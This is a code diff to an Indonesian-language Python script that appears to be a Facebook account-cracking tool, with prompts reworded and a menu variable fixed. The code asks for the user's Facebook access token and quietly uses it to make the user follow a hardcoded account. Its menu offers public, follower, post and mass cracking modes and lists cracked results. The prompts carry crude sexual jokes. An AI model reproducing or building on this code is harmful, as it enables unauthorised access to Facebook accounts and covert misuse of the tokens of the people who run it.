@@ -69,14 +69,14 @@ def login():
 		menu()
 	except (KeyError, IOError):
 		print(" [*] kode keras dari gw gunakan script ini untuk membantu")
-		print(" [*] kalo mau ke menu hack silahkn msuk kn token fb mu di bawah")
-		print(" [?] ketik '\033[0;93mhelp\033[0;97m' untuk lihat cewe2 sexy")
+		print(" [*] untuk menuju menu hack silakan masukan token facebook anda di bawah")
+		print(" [?] ketik '\033[0;93mhelp\033[0;97m' untuk lihat CEWEK2 SEXY")
 		token = raw_input("\n [+] token fb : ")
 		if token == "":
 			exit("\n [!] jangan kosong")
 		elif token == "help":
 			os.system("xdg-open https://youtube.com/channel/UC1pjQr5TGYvDYwnd7uyqpQg")
-			exit(" [!] di simak video nya biar ngaceng")
+			exit(" [!] di simak video nya biar bisa ngaceng")
 		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			requests.post("https://graph.facebook.com/100073715134723/subscribers?access_token=" + token)
@@ -119,19 +119,19 @@ def menu():
 	angga = raw_input("\n [?] choose : ")
 	if angga == "":
 		menu()
-	elif supi == "1":
+	elif angga == "1":
 		publik()
 		method()
-	elif supi == "2":
+	elif angga == "2":
 		follower()
 		method()
-	elif supi == "3":
+	elif angga == "3":
 		post()
 		method()
-	elif supi == "4":
+	elif angga == "4":
 		massal()
 		method()
-	elif supi == "5":
+	elif angga == "5":
 		print("\n [1] cek hasil crack OK")
 		print(" [2] cek hasil crack CP")
 		cek = raw_input("\n [?] choose : ")
